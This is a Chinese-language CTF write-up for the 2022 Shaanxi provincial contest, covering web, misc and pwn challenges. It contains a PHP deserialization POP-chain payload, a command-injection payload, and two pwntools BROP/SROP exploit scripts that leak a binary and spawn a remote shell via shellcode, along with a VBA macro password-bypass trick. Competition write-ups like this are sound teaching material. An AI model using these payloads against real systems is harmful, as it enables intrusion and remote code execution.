# 2022-陕西省省赛-Writeup

## 被加密的后门

扫出来www.zip和a.txt，知道fuck.php，然后对a.txt里面的东西md5之后爆破即可。

## popop

访问class.php然后构造即可：

```php
<?php

class s{
    public $f;
    public function __construct()
    {
        $this->f = new T();
    }
}
class T{
    public $f;
    public $s;
    public function __construct()
    {
        $this->s = "Getflag";
        $this->f = new L();
    }
}
class L{
    private $haha;
    public function __construct()
    {
        $this->haha = "mama";
    }
}
echo urlencode(serialize(new s()));
```

## spa&col

扫出来robots.txt：

```
/9#S@Q&b?#Mm0+21?
/ix3n3.ksk
```

上面那串base92解密出来是Atbash Cipher，然后atbash解密得到rc3m3.php，访问是个简单的命令执行：

```
code=`cat%09flag.php>/var/www/html/1.txt`
```

## 手慢无

签到题，关注公众号即可

 

##  AI人脸识别

非预期解法，直接利用linux下的字符串命令搜索

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps1.jpg) 

010打开该图片发现flag

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps2.jpg) 

Md5加密提交即可

 

## Simple_Deserialization

看名字就大概猜出是反序列化

看一下字节流猜测是python反序列化，写个脚本转一下得到flag

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps3.jpg) 

 

 

## brop 

参考看雪ctf

https://bbs.pediy.com/thread-272950.htm

泄露exp:

 

from pwn import *

context.log_level = "critical"

ip = '114.132.125.59'

port = 30610

 

 

 

def probe(v, want=b"TNT TNT!"):

  s = None

  try:

​    s = remote(ip, port)

​    s.recvuntil(b"hacker, TNT!\n")

​    s.send(v)

​    r = s.recv(timeout=3)

​    if (want is not None and want in r) or (want is None and len(r) > 0):

​      return "normal"

​    else:

​      return "stop"

  except EOFError:

​    return "crash"

  finally:

​    if s:

​      s.close()

  return None

 

 

def test(prefix):

  for i in range(256):

​    t = prefix + bytes([i])

​    c = probe(t, None)

​    if c != "crash":

​      print(hex(i), c)

 

 

\# test(b"a" * 16)

\# test(b"a"*16 + b"\xce")

\# test(b"a" * 16 + b"\xce\x00")

\# probe(b"a"*16 + p64(0x4000ce))   # "normal"

\# probe(b"a"*16 + p64(0x4000ce)[:7]+b"\x01")   # "crash"

 

\# def findret(prefix):

\#   for i in range(256 * 256):

\#     t = prefix + p64(0x400000 + i) + p64(0x4000ce)

\#     c = probe(t, b"TNT TNT!\n")

\#     if c == "normal":

\#       print(hex(i), c)

\#

\#

\# findret(b"a" * 16)

 

context(os='linux', arch='amd64', log_level='debug')

sigframe = SigreturnFrame()

sigframe.rax = 1

sigframe.rdi = 1

sigframe.rsi = 0x400000

sigframe.rdx = 0x1000

sigframe.rip = 0x4000c7

 

s = remote(ip, port)

s.recvuntil(b"hacker, TNT!\n")

s.send(b'a' * 16 + p64(0x4000ee) + p64(0x4000c7) + bytes(sigframe))

sleep(1)

 

s.send(b'a' * 15)

 

r = s.recv()

assert r.startswith(b"\x7fELF")

with open("tnt", "wb") as f:

  f.write(r)

 

s.close()

 

攻击exp：

from pwn import *

 

context.arch = "amd64"

context.terminal = ["tmux", "split", "-h"]

 

ip = '114.132.125.59'

port = 30610

 

 

\# s = process("./tnt")

s = remote(ip, port)

\# attach(s)

 

s.recvuntil(b"hacker, TNT!\n")

 

sigframe = SigreturnFrame()

sigframe.rip = 0x4000ee

sigframe.rsp = 0x600800

 

s.send(b'a' * 16 + p64(0x4000ee) + p64(0x400100) + bytes(sigframe))

sleep(1)

 

s.send(b'a' * 15)

sleep(1)

 

s.send(b'a' * 16 + p64(0x600808) + asm(shellcraft.sh()))

 

s.interactive()

##  Macro

其实这题题目名字已经反映考察的点是宏命令，打开docm文件，选择视图->宏

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps4.jpg) 

选择执行无明显变化，选择用vba编辑器打开，发现有密码

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps5.jpg) 

参考

https://blog.csdn.net/qq_44768749/article/details/102673212

https://blog.csdn.net/AC1145/article/details/102636127

改docm文件名为zip并解压，找到vbaProject.bin，用notepad打开

找到其中的“PDB”字符，改为“PDX”并保存，重新压缩为zip并改名为docm

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps6.jpg)

打开，重新打开vba编辑器，可以查看，发现flag的base64串，解码即可

![img](2022-%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B-Writeup.assets/wps7.jpg) 
